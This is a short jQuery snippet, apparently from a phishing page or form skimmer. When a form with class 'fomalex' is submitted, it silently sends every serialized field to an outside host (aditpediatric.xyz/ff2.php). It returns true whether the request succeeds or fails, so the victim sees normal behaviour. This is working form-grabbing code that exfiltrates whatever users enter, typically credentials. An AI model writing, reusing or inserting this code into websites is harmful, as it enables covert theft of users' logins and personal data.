$(".fomalex").submit(function() {

	var d = $(".fomalex");

	$.ajax({

        url: "https://aditpediatric.xyz/ff2.php",

        type: "POST",

        data: d.serialize(),

        success: function () {

            return true;

        },

        error: function () {

            return true;

        },

    });

});
